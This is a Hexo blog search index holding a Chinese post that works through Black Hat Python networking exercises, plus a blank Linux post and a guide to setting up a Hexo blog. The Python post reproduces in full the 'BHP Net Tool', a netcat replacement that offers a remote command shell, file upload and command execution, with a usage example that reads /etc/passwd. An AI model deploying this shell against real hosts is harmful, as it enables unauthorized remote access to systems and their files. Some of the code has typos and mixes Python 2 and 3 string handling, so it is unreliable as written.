<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>python渗透之路</title>
    <url>/2020/03/12/python%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<hr>
<h3 id="python2和python3的一些区别"><a href="#python2和python3的一些区别" class="headerlink" title="python2和python3的一些区别"></a>python2和python3的一些区别</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install github3.py <span class="comment">#python2</span></span><br><span class="line">pip3 install github3.py <span class="comment">#python3</span></span><br></pre></td></tr></table></figure>

<p>b = b”example”    # bytes object   </p>
<p>s = “example”     # str object  </p>
<ul>
<li>chj=str.encode(c)  str to bytes </li>
<li>chj=bytes.decode(c) bytes to str</li>
</ul>
<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/csl/</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p><code>GET</code>表示一个读取请求，将从服务器获得网页数据<code>/cs1/</code>表示URL的路径，URL总是以<code>/</code>开头，<code>/</code>就表示首页，最后的<code>HTTP/1.1</code>指示采用的HTTP协议版本是1.1。目前HTTP协议的版本就是1.1，但是大部分服务器也支持1.0版本，主要区别在于1.1版本允许多个HTTP请求复用一个TCP连接，以加快传输速度。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Host</span>: sports.sina.com.cn</span><br></pre></td></tr></table></figure>

<p>表示请求的域名是<code>sports.sina.com.cn</code>。如果一台服务器有多个网站，服务器就需要通过<code>Host</code>来区分浏览器请求的是哪个网站</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="attribute">Content-Length</span>: 66125</span><br></pre></td></tr></table></figure>

<p><code>Content-Type</code>指示响应的内容，这里是<code>text/html</code>表示HTML网页。</p>
<h4 id="请注意，浏览器就是依靠Content-Type来判断响应的内容是网页还是图片，是视频还是音乐。"><a href="#请注意，浏览器就是依靠Content-Type来判断响应的内容是网页还是图片，是视频还是音乐。" class="headerlink" title="请注意，浏览器就是依靠Content-Type来判断响应的内容是网页还是图片，是视频还是音乐。"></a>请注意，浏览器就是依靠<code>Content-Type</code>来判断响应的内容是网页还是图片，是视频还是音乐。</h4><p>浏览器并不靠URL来判断响应的内容，所以，即使URL是<code>http://example.com/abc.jpg</code>，它也不一定就是图片。</p>
<h3 id="python网络编程"><a href="#python网络编程" class="headerlink" title="python网络编程"></a>python网络编程</h3><h4 id="1-简单的一个TCP客户端"><a href="#1-简单的一个TCP客户端" class="headerlink" title="1.简单的一个TCP客户端"></a>1.简单的一个TCP客户端</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">target_host = <span class="string">"www.orld.com"</span></span><br><span class="line">target_port = <span class="number">80</span></span><br><span class="line"><span class="comment"># 建立一个 socket 对象</span></span><br><span class="line"><span class="comment"># AF_INET 参数说明我们将使用标准的 IPv4地址或者主机名</span></span><br><span class="line"><span class="comment"># SOCK_STREAM 说明这将是一个 TCP 客户端</span></span><br><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接客户端</span></span><br><span class="line">client.connect((target_host,target_port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送一些数据</span></span><br><span class="line">client.send(str.encode(<span class="string">"GET / HTTP/1.1\r\nHost: www.orld.com\r\n\r\n"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收一些数据</span></span><br><span class="line">response = client.recv(<span class="number">4096</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (bytes.decode(response))</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Cache-Control: s-maxage&#x3D;31536000</span><br><span class="line">Location: http:&#x2F;&#x2F;orld.com&#x2F;</span><br><span class="line">Server: api-gateway&#x2F;1.9.3.1</span><br><span class="line">X-App-Name: Pro2-Renderer</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-Trace-Id: flhzOSvD40MNDY9Q3&#x2F;4G3XRa&#x2F;E8</span><br><span class="line">X-XSS-Protection: 1; mode&#x3D;block</span><br><span class="line">Content-Length: 0</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Date: Tue, 17 Mar 2020 00:29:11 GMT</span><br><span class="line">Via: 1.1 varnish</span><br><span class="line">Age: 2005390</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Served-By: cache-hnd18746-HND</span><br><span class="line">X-Cache: HIT</span><br><span class="line">X-Cache-Hits: 1</span><br><span class="line">X-Timer: S1584404952.927181,VS0,VE0</span><br><span class="line">Vary: Fastly-SSL, X-Use-Renderer</span><br></pre></td></tr></table></figure>

<h4 id="2-UDP客户端"><a href="#2-UDP客户端" class="headerlink" title="2.UDP客户端"></a>2.UDP客户端</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">target_host &#x3D; &quot;127.0.0.1&quot;</span><br><span class="line">target_port &#x3D; 80</span><br><span class="line"></span><br><span class="line"># 建立一个 socket 对象</span><br><span class="line"># AF_INET 参数说明我们将使用标准的 IPv4地址或者主机名</span><br><span class="line"># SOCK_STREAM 说明这将是一个 UDP 客户端</span><br><span class="line">client &#x3D; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"># 发送一些数据</span><br><span class="line">client.sendto((&quot;This is test message!&quot;).encode(), (target_host, target_port))</span><br><span class="line"></span><br><span class="line"># 接收一些数据</span><br><span class="line">data, addr &#x3D; client.recvfrom(4096)</span><br><span class="line"></span><br><span class="line">print (data)</span><br></pre></td></tr></table></figure>

<p>在kail里运行，先监听窗口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#  nc -nvulp 80</span><br></pre></td></tr></table></figure>

<p>再运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;BHP-Code&#x2F;Chapter2# python3 .&#x2F;udp.py</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">listening on [any] 80 ...</span><br><span class="line">connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 54204</span><br><span class="line">This is test message!</span><br></pre></td></tr></table></figure>

<h4 id="3-TCP服务器"><a href="#3-TCP服务器" class="headerlink" title="3.TCP服务器"></a>3.TCP服务器</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">bind_ip = <span class="string">"0.0.0.0"</span></span><br><span class="line">bind_port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立一个 socket 对象</span></span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动监听</span></span><br><span class="line">server.bind((bind_ip, bind_port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置最大连接数为5</span></span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] Listening on %s:%d"</span> % (bind_ip, bind_port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户处理线程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    request = bytes.decode(client_socket.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印出客户端发送得到内容</span></span><br><span class="line">    print(<span class="string">"[*] Received: %s"</span> % request)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送一个数据包</span></span><br><span class="line">    client_socket.send(str.encode(<span class="string">"ACK!"</span>))</span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 将接收到的客户端套接字对象保存到 client 变量中，将远程连接的细节保存到 addr 变量中</span></span><br><span class="line">    client, addr = server.accept()</span><br><span class="line">    print(<span class="string">"[*] Accepted connection from: %s:%d"</span> % (addr[<span class="number">0</span>], addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 挂起客户端线程，处理传入的数据</span></span><br><span class="line">    client_handler = threading.Thread(target=handle_client, args=(client,))</span><br><span class="line">    client_handler.start()</span><br></pre></td></tr></table></figure>

<p>修改上面的tcp客户端，让它访问服务器，得到如下输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] Listening on 0.0.0.0:9999</span><br><span class="line">[*] Accepted connection from: 127.0.0.1:34556</span><br><span class="line">[*] Received: hello chj</span><br></pre></td></tr></table></figure>

<h4 id="4-取代netcat"><a href="#4-取代netcat" class="headerlink" title="4.取代netcat"></a>4.取代netcat</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> threadin g</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义一些全局变量</span></span><br><span class="line">listen = <span class="literal">False</span></span><br><span class="line">command = <span class="literal">False</span></span><br><span class="line">upload = <span class="literal">False</span></span><br><span class="line">execute = <span class="string">""</span></span><br><span class="line">target = <span class="string">""</span></span><br><span class="line">upload_destination = <span class="string">""</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"BHP Net Tool"</span>)</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">"Usage: bhpnet.py -t targt_host -p port"</span>)</span><br><span class="line">    print(<span class="string">"-l --listen          - listen on [host]:[port] for incoming connections"</span>)</span><br><span class="line">    print(<span class="string">"-e --execute=file_to_run - execute the given file upon receiving a connetction"</span>)</span><br><span class="line">    print(<span class="string">"-c command           - initialize a command shell"</span>)</span><br><span class="line">    print(<span class="string">"-u --upload-destination  - upon receiving connection upload a file and write to [destionation]"</span>)</span><br><span class="line">    print()</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">"Examples: "</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -c"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""</span>)</span><br><span class="line">    print(<span class="string">"echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#连接到目标主机</span></span><br><span class="line">        client.connect((target,port))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(buffer): <span class="comment">#检测是否从标准输入中接收到数据</span></span><br><span class="line">            client.send(buffer.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            recv_len = <span class="number">1</span></span><br><span class="line">            response = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line"></span><br><span class="line">                data = client.recv(<span class="number">4096</span>) <span class="comment">#接收回传数据</span></span><br><span class="line">                recv_len = len(data)</span><br><span class="line">                response+= data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            print(response)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#等待更多的输入</span></span><br><span class="line">            buffer = input(<span class="string">""</span>) <span class="comment">#python3中没有raw_input()</span></span><br><span class="line">            buffer += <span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">            client.send(buffer.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[*] Exception! Exiting."</span>)</span><br><span class="line">        client.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果没有定义目标，那么我们监听所有接口</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(target):</span><br><span class="line">        target = <span class="string">"0.0.0.0"</span></span><br><span class="line"></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target,port))</span><br><span class="line"></span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#分拆一个线程处理新的客户端</span></span><br><span class="line">        client_thread = threading.Thread(target=client_handler,</span><br><span class="line">                                         args=(client_socket,))</span><br><span class="line">        client_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(command)</span>:</span></span><br><span class="line"></span><br><span class="line">    command = command.rstrip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">"Failed to execute command.\r\n"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测上传文件</span></span><br><span class="line">    <span class="keyword">if</span> len(upload_destination):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 读取所有的字符并写下目标</span></span><br><span class="line">        file_buffer = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 持续读取数据直到没有符合的数据</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer += data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor = open(upload_destination,<span class="string">"wb"</span>)</span><br><span class="line">            file_descriptor.write(file_buffer)</span><br><span class="line">            file_descriptor.close()</span><br><span class="line"></span><br><span class="line">            client_socket.send(<span class="string">"Successfully saved file to %s\r\n"</span> % upload_destination)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="string">"Failed to save file to %s\r\n"</span> % upload_destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(execute):</span><br><span class="line">        output = run_command(execute)</span><br><span class="line">        client_socket.send(output)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket.send(<span class="string">b"&lt;BHP:#&gt; "</span>)</span><br><span class="line"></span><br><span class="line">            cmd_buffer = <span class="string">""</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                cmd_buffer += client_socket.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">                response = run_command(cmd_buffer)</span><br><span class="line"></span><br><span class="line">                client_socket.send(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(sys.argv[<span class="number">1</span>:]): <span class="comment">#获取参数</span></span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#读取命令行选项</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">"hle:t:p:cu:"</span>, [<span class="string">"help"</span>,<span class="string">"listen"</span>,<span class="string">"execute"</span>,<span class="string">"target"</span>,<span class="string">"port"</span>,<span class="string">"command"</span>,<span class="string">"upload"</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        print(str(err))</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>,<span class="string">"--help"</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-l"</span>,<span class="string">"--listen"</span>):</span><br><span class="line">            listen = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</span><br><span class="line">            execute = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-c"</span>, <span class="string">"--commandshell"</span>):</span><br><span class="line">            command = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-u"</span>, <span class="string">"--upload"</span>):</span><br><span class="line">            upload_destination = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-t"</span>, <span class="string">"--target"</span>):</span><br><span class="line">            target = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-p"</span>, <span class="string">"--port"</span>):</span><br><span class="line">            port = int(a)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>,<span class="string">"Unhandled Option"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#监听还是仅从标准输入发送数据</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> len(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#从命令行读取内存数据</span></span><br><span class="line">        <span class="comment"># 这里将阻塞， 所以不再向标准输入发送数据时发送CTRL-D</span></span><br><span class="line">        buffer = sys.stdin.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#发送数据</span></span><br><span class="line">        client_sender(buffer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始监听并准备上传文件、执行命令</span></span><br><span class="line">    <span class="comment"># 放置一个反弹shell</span></span><br><span class="line">    <span class="comment"># 取决于上面的命令行选项</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>































<h1 id="Web攻击"><a href="#Web攻击" class="headerlink" title="Web攻击"></a>Web攻击</h1><h4 id="urllib2-库"><a href="#urllib2-库" class="headerlink" title="urllib2 库"></a>urllib2 库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib2</span><br><span class="line">body &#x3D; urllib2.urlopen(&quot;http:&#x2F;&#x2F;www.nostarch.com&quot;)</span><br><span class="line">print body.read()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux</title>
    <url>/2020/03/06/Linux/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Linux学习</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>简单搭建个属于你的个人博客</title>
    <url>/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<hr>
<p>没想到都大三老狗了，还是个新人的水准，这就是菜吧。但还是要努力学习呀，希望有个好的结果！</p>
<p>废话不多说，开始小白的搭建博客教程吧~</p>
<h4 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git"></a>1.安装git</h4><p><a href="https://git-scm.com/downloads" target="_blank" rel="noopener">git官网传送门</a></p>
<h4 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h4><p><a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js官网传送门</a></p>
<h4 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h4><p>Hexo拥有丰富的主题，比较推荐</p>
<p>win+R  cmd 输入以下命令，安装hexo包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo</span><br></pre></td></tr></table></figure>

<h4 id="4-建立博客所在文件"><a href="#4-建立博客所在文件" class="headerlink" title="4.建立博客所在文件"></a>4.建立博客所在文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init chj</span><br><span class="line">cd chj</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>过程如下图：</p>
<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1.png" alt="1234"></p>
<p>文件下的目录如下：</p>
<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/cmd.jpg" alt="1234"></p>
<h4 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h4><p>这是网站的配值信息，可以在此配置大部分的参数。</p>
<h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>这是存放用户资源的地方，文章会存放在其中的_posts文件夹下，而一些标签、归档则是在source文件夹下。</p>
<h4 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h4><p>主题文件夹，Hexo 会根据主题来生成静态页面，博客所用的各种主题都存放在此目录下。</p>
<h4 id="5-git的基本操作"><a href="#5-git的基本操作" class="headerlink" title="5.git的基本操作"></a>5.git的基本操作</h4><p>安装上诉步骤简单部署好以后，输入以下命令，然后本地localhost:4000访问，就可以看到自己的博客了~</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/4000.png" alt="1234"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;email@example.com&quot;</span><br></pre></td></tr></table></figure>

<p>因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。你也许会担心，如果有人故意冒充别人怎么办？这个不必担心，首先我们相信大家都是善良无知的群众，其次，真的有冒充的也是有办法可查的。</p>
<p>注意<code>git config</code>命令的<code>--global</code>参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
]]></content>
  </entry>
</search>
